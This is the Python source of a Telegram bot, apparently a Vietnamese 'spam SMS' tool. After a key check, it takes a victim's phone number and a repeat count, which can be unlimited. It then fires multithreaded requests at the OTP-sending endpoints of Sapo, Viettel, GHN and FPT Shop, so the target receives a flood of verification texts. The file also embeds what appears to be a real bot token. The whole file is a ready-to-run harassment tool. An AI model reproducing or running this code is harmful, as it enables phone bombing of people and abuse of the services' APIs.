import threading
import time
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ==================== CẤU HÌNH HỆ THỐNG ====================
BOT_TOKEN = "8830710724:AAGpzsBkui7kJCBGqYFkMu8Brbm-R49lCJs"
ADMIN_ID = 8985238179
CORRECT_KEY = "anhanh88"

# ==================== PHẦN MÃ NGUỒN SPAM SMS ====================

def send_otp_via_sapo(sdt):
    try:
        cookies = {'landing_page': 'https://www.sapo.vn/', 'lang': 'vi'}
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        data = {'phonenumber': sdt}
        requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data, timeout=5)
    except:
        pass

def send_otp_via_viettel(sdt):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'actionCode': 'myviettel://login_mobile', 'type': 'otp_login'}
        requests.post('https://viettel.vn/api/getOTPLoginCommon', headers=headers, json=json_data, timeout=5)
    except:
        pass

def send_otp_via_ghn(sdt):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'content-type': 'application/json'}
        json_data = {'phone': sdt, 'type': 'register'}
        requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=5)
    except:
        pass

def send_otp_via_fptshop(sdt):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'content-type': 'application/json'}
        json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': sdt}
        requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=5)
    except:
        pass

sms_functions = [
    send_otp_via_sapo,
    send_otp_via_viettel,
    send_otp_via_ghn,
    send_otp_via_fptshop
]

def run_spam(sdt, loops):
    current_loop = 0
    while True:
        threads = []
        for func in sms_functions:
            t = threading.Thread(target=func, args=(sdt,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        
        current_loop += 1
        if loops > 0 and current_loop >= loops:
            break
        time.sleep(1)

# ==================== QUẢN LÝ TRẠNG THÁI & TELEGRAM BOT ====================

authenticated_users = set()
user_state = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        authenticated_users.add(user_id)

    if user_id in authenticated_users:
        user_state[user_id] = {"step": "waiting_phone"}
        await update.message.reply_text("🤖 Chào Admin/User! Tool đã sẵn sàng. Vui lòng nhập số điện thoại cần spam:")
    else:
        user_state[user_id] = {"step": "waiting_key"}
        await update.message.reply_text("🔒 Tool đã bị khóa!\nVui lòng nhập KEY để sử dụng:")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id == ADMIN_ID:
        authenticated_users.add(user_id)

    if user_id not in user_state:
        user_state[user_id] = {"step": "waiting_key"}

    current_step = user_state[user_id]["step"]

    if current_step == "waiting_key":
        if text == CORRECT_KEY:
            authenticated_users.add(user_id)
            user_state[user_id]["step"] = "waiting_phone"
            await update.message.reply_text("✅ Mở khóa thành công!\nNhập số điện thoại cần spam:")
        else:
            await update.message.reply_text("❌ Key không chính xác! Vui lòng nhập lại key:")
        return

    if current_step == "waiting_phone":
        if not text.isdigit() or len(text) < 9:
            await update.message.reply_text("❌ Số điện thoại không hợp lệ. Vui lòng nhập lại:")
            return
        
        user_state[user_id]["phone"] = text
        user_state[user_id]["step"] = "waiting_loops"
        await update.message.reply_text(
            "Nhập số lần muốn spam:\n"
            "(Ví dụ: `10` để chạy 10 lần, hoặc nhập `0` / `vô hạn` để chạy liên tục không dừng):",
            parse_mode="Markdown"
        )
        return

    if current_step == "waiting_loops":
        phone = user_state[user_id]["phone"]
        
        if text.lower() in ["0", "vô hạn", "vohan", "infinite"]:
            loops = 0
            loop_str = "Vô hạn (liên tục)"
        elif text.isdigit():
            loops = int(text)
            loop_str = f"{loops} lần"
        else:
            await update.message.reply_text("❌ Định dạng không hợp lệ. Vui lòng nhập một số nguyên hoặc chữ 'vô hạn':")
            return

        await update.message.reply_text(
            f"🚀 Bắt đầu spam tới `{phone}`\n"
            f"🔄 Số lần lặp: *{loop_str}*...",
            parse_mode="Markdown"
        )

        threading.Thread(target=run_spam, args=(phone, loops)).start()
        user_state[user_id]["step"] = "waiting_phone"
        await update.message.reply_text("Gửi một số điện thoại mới nếu bạn muốn tiếp tục thực hiện lệnh khác.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()
